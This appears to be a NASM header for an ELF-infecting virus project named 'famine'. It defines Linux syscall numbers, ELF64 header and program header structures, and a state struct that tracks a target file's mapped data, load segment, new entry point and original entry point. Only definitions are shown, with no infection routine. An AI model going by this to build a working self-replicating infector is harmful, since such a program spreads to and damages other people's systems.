%define PROG_SIZE   _end - main
%define JMP_OFFSET  jump - main
%define SIGNATURE_SIZE _end - signature
%define O_WRONLY	1
%define O_RDWR      2
%define O_APPEND	1024
%define SEEK_END    2
%define PROT_READ   1
%define PROT_WRITE  2
%define MAP_SHARED  1
%define PT_LOAD	    1
%define PF_X        1

%define SYS_WRITE   1
%define SYS_OPEN    2
%define SYS_CLOSE   3
%define SYS_LSEEK   8
%define SYS_MMAP    9
%define SYS_MUNMAP  11
%define SYS_EXIT    60

struc   Elf64_Ehdr
    e_ident:     resb 16   ;       /* Magic number and other info */
    e_type:      resw 1    ;		/* Object file type */
    e_machine:   resw 1    ;		/* Architecture */
    e_version:   resd 1    ;		/* Object file version */
    e_entry:     resq 1    ;		/* Entry point virtual address */
    e_phoff:     resq 1    ;		/* Program header table file offset */
    e_shoff:     resq 1    ;		/* Section header table file offset */
    e_flags:     resd 1    ;		/* Processor-specific flags */
    e_ehsize:    resw 1    ;		/* ELF header size in bytes */
    e_phentsize: resw 1    ;		/* Program header table entry size */
    e_phnum:     resw 1    ;		/* Program header table entry count */
    e_shentsize: resw 1    ;		/* Section header table entry size */
    e_shnum:     resw 1    ;		/* Section header table entry count */
    e_shstrndx:  resw 1    ;		/* Section header string table index */
endstruc

struc Elf64_Phdr
    p_type:   resd 1 ;	    /* Segment type */
    p_flags:  resd 1 ;		/* Segment flags */
    p_offset: resq 1 ;		/* Segment file offset */
    p_vaddr:  resq 1 ;	    /* Segment virtual address */
    p_paddr:  resq 1 ;	    /* Segment physical address */
    p_filesz: resq 1 ;		/* Segment size in file */
    p_memsz:  resq 1 ;		/* Segment size in memory */
    p_align:  resq 1 ;		/* Segment alignment */
endstruc

struc famine
    fileName:   resq 1
    fd:         resq 1
    fileSize:   resq 1
    segv_mode:  resq 1
    fileData:   resq 1
    pload:      resq 1
    entry:      resq 1
    oldEntry:   resq 1
endstruc
